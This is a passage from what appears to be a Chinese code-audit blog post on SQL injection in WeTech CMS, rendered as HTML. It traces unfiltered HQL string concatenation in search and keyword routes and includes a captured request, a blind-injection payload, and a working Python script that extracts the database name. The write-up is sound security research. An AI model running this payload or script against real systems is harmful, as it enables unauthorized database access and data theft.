+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>cq</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getCountHql</span><span class=p>(</span><span class=n>hql</span><span class=p>,</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Query</span><span class=w> </span><span class=n>cquery</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getSession</span><span class=p>().</span><span class=na>createQuery</span><span class=p>(</span><span class=n>cq</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Query</span><span class=w> </span><span class=n>query</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getSession</span><span class=p>().</span><span class=na>createQuery</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>//设置别名参数</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setAliasParameter</span><span class=p>(</span><span class=n>query</span><span class=p>,</span><span class=w> </span><span class=n>alias</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setAliasParameter</span><span class=p>(</span><span class=n>cquery</span><span class=p>,</span><span class=w> </span><span class=n>alias</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>//设置参数</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setParameter</span><span class=p>(</span><span class=n>query</span><span class=p>,</span><span class=w> </span><span class=n>args</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setParameter</span><span class=p>(</span><span class=n>cquery</span><span class=p>,</span><span class=w> </span><span class=n>args</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>pages</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setPagers</span><span class=p>(</span><span class=n>query</span><span class=p>,</span><span class=n>pages</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>List</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>datas</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>query</span><span class=p>.</span><span class=na>list</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>pages</span><span class=p>.</span><span class=na>setDatas</span><span class=p>(</span><span class=n>datas</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=kt>long</span><span class=w> </span><span class=n>total</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Long</span><span class=p>)</span><span class=n>cquery</span><span class=p>.</span><span class=na>uniqueResult</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>pages</span><span class=p>.</span><span class=na>setTotal</span><span class=p>(</span><span class=n>total</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=n>pages</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 最后在这里执行了查询，中间并未发现过滤。那么我们回过头向上追溯。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=s>&#34;/keyword/{con}&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>keyword</span><span class=p>(</span><span class=nd>@PathVariable</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>con</span><span class=p>,</span><span class=w> </span><span class=n>Model</span><span class=w> </span><span class=n>model</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>model</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;kws&#34;</span><span class=p>,</span><span class=w> </span><span class=n>keywordService</span><span class=p>.</span><span class=na>getMaxTimesKeyword</span><span class=p>(</span><span class=n>9</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setOrder</span><span class=p>(</span><span class=s>&#34;desc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setSort</span><span class=p>(</span><span class=s>&#34;t.publishDate&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>Topic</span><span class=o>&gt;</span><span class=w> </span><span class=n>topics</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>topicService</span><span class=p>.</span><span class=na>searchTopicByKeyword</span><span class=p>(</span><span class=n>con</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>focus</span><span class=p>(</span><span class=n>topics</span><span class=p>,</span><span class=w> </span><span class=n>con</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>model</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;datas&#34;</span><span class=p>,</span><span class=w> </span><span class=n>topics</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>model</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;con&#34;</span><span class=p>,</span><span class=w> </span><span class=n>con</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=s>&#34;index/keyword&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 通过路由我们定位到标签检索功能，并获得如下数据包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/keyword/1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.24.95.182:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.24.95.182:8888/index</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>collapase-nav=collapse-nav1; JSESSIONID=561775642554B23D11BFD032DEE33BB4</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 构造payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; or keyword like (case when ascii(substr(database(),1,1))=1 then &#39;</span><span class=n>a</span><span class=s1>&#39; else &#39;&#39; end) and keyword like &#39;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 于是我们有如下python脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://172.21.55.165:8888/keyword/1&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>url1</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),1,1))=10 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前十个字符串的10位false包</span>
+</span></span><span class=line><span class=cl><span class=n>url2</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),1,1))=100 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前十个字符串的100位false包</span>
+</span></span><span class=line><span class=cl><span class=n>url1_1</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),10,1))=10 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前一百个字符串的10位false包</span>
+</span></span><span class=line><span class=cl><span class=n>url2_1</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),10,1))=100 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前一百个字符串的100位false包</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>req</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>req1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url1</span><span class=p>)</span><span class=c1>#获取前十个字符串的100位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>req2</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url2</span><span class=p>)</span><span class=c1>#获取前十个字符串的100位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>req1_1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url1_1</span><span class=p>)</span><span class=c1>#获取前一百个字符串的10位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>req2_1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url2_1</span><span class=p>)</span><span class=c1>#获取前一百个字符串的100位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len2</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len1_1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req1_1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len2_1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req2_1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>12</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span><span class=mi>127</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>payload</span><span class=o>=</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),</span><span class=si>{i}</span><span class=s2>,1))=</span><span class=si>{k}</span><span class=s2> then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=n>i</span><span class=p>,</span><span class=n>k</span><span class=o>=</span><span class=n>k</span><span class=p>)</span><span class=c1>#SQL注入payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>th_url</span> <span class=o>=</span> <span class=n>url</span> <span class=o>+</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>second</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>th_url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>s_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>second</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k</span> <span class=o>&lt;</span> <span class=mi>100</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len1_1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len2</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len2_1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>req</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 成功获取库名：</p><p><img src=/p/wetech-cms/image-20241127134337976-1732686251093-2-1732721872717-1-1732721891177-9-1732797677430-1.png width=566 height=52 srcset="/p/wetech-cms/image-20241127134337976-1732686251093-2-1732721872717-1-1732721891177-9-1732797677430-1_hu4954636868627867555.png 480w, /p/wetech-cms/image-20241127134337976-1732686251093-2-1732721872717-1-1732721891177-9-1732797677430-1_hu5472465474502771369.png 1024w" loading=lazy alt=image-20241127134337976 class=gallery-image data-flex-grow=1088 data-flex-basis=2612px></p><h5 id=第53行-searchtopic>第53行-searchTopic：</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>Topic</span><span class=o>&gt;</span><span class=w> </span><span class=nf>searchTopic</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>con</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getTopicSelect</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34; from Topic t where t.status=1 and &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;(title like &#39;%&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>con</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=o>+</span><span class=w> </span><span class=s>&#34;%&#39; or content like &#39;%&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>con</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;%&#39; or summary like &#39;%&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>con</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;%&#39;)&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>find</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 我们先追溯find函数，看看有没有过滤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=nf>find</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>alias</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>initSort</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>cq</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getCountHql</span><span class=p>(</span><span class=n>hql</span><span class=p>,</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Query</span><span class=w> </span><span class=n>cquery</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getSession</span><span class=p>().</span><span class=na>createQuery</span><span class=p>(</span><span class=n>cq</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Query</span><span class=w> </span><span class=n>query</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getSession</span><span class=p>().</span><span class=na>createQuery</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>//设置别名参数</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setAliasParameter</span><span class=p>(</span><span class=n>query</span><span class=p>,</span><span class=w> </span><span class=n>alias</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setAliasParameter</span><span class=p>(</span><span class=n>cquery</span><span class=p>,</span><span class=w> </span><span class=n>alias</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>//设置参数</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setParameter</span><span class=p>(</span><span class=n>query</span><span class=p>,</span><span class=w> </span><span class=n>args</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setParameter</span><span class=p>(</span><span class=n>cquery</span><span class=p>,</span><span class=w> </span><span class=n>args</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>pages</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>setPagers</span><span class=p>(</span><span class=n>query</span><span class=p>,</span><span class=n>pages</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>List</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>datas</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>query</span><span class=p>.</span><span class=na>list</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>pages</span><span class=p>.</span><span class=na>setDatas</span><span class=p>(</span><span class=n>datas</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=kt>long</span><span class=w> </span><span class=n>total</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Long</span><span class=p>)</span><span class=n>cquery</span><span class=p>.</span><span class=na>uniqueResult</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>pages</span><span class=p>.</span><span class=na>setTotal</span><span class=p>(</span><span class=n>total</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=n>pages</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 同样的地方，没有任何的过滤，那么我们直接向上追溯。</p><p>​ 这里我发现有两个地方调用这个方法</p><p>​ 分别是<strong>IndexController.java</strong>中的</p><p>​ 42行-search:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/search&#34;</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>RequestMethod</span><span class=p>.</span><span class=na>POST</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>Topic</span><span class=o>&gt;</span><span class=w> </span><span class=nf>search</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>con</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setOrder</span><span class=p>(</span><span class=s>&#34;asc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setSort</span><span class=p>(</span><span class=s>&#34;c.orders&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setOrder</span><span class=p>(</span><span class=s>&#34;desc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setSort</span><span class=p>(</span><span class=s>&#34;t.publishDate&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>Topic</span><span class=o>&gt;</span><span class=w> </span><span class=n>topics</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>topicService</span><span class=p>.</span><span class=na>searchTopic</span><span class=p>(</span><span class=n>con</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>// 将关键字着色</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>focus</span><span class=p>(</span><span class=n>topics</span><span class=p>,</span><span class=w> </span><span class=n>con</span><span class=p>);</span><span class=w>
